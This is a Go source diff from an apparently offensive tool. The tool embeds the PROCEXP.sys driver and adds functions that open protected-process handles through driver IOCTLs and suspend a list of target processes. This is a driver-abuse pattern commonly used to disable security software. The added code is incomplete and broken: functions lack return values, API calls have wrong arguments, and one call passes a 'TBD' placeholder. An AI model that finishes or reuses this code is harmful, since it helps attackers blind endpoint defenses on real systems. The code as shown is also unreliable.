@@ -20,10 +20,22 @@ var content_processes string
 //go:embed Resources/PROCEXP.sys
 var driver []byte
 
-func suspend_processes(handle windows.HANDLE, targets []string) error {
-	windows.DeviceIoControl(handle, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)
+func suspend_processes(traget_proc_handle windows.HANDLE, targets []string) error {
+	windows.DeviceIoControl(traget_proc_handle, 0x7299c004, nil, 4, nil, 0, &local_1c, nil)
 
 	return nil
+}
+
+func procexp_protected_process(volume_handle windows.HANDLE, pid int) (windows.HANDLE, error) {
+	// 0x8335003c = IOCTL_OPEN_PROTECTED_PROCESS_HANDLE
+	var handle windows.HANDLE = windows.NULL
+	a, b, c := windows.DeviceIoControl(volume_handle, 0x8335003c, pid, len(pid))
+
+}
+
+func get_target_pid(process string) (int, error) {
+	windows.Process32First()
+
 }
 
 func connect_procexp_device() (windows.HANDLE, error) {
@@ -230,7 +242,13 @@ func main() {
 	fmt.Println("[+] Successfully loaded PROCEXP driver")
 	defer unload_driver(DRIVERNAME)
 
-	handle, err := connect_procexp_device()
+	volume_handle, err := connect_procexp_device()
 	check(err)
 	fmt.Println("[+] Successfully connected to PROCEXP driver")
+
+	for i := 0; i < len(process_list); i++ {
+		pid := get_target_pid()
+		proc_handle, err := procexp_protected_process(volume_handle, pid)
+		err = suspend_processes(TBD)
+	}
 }
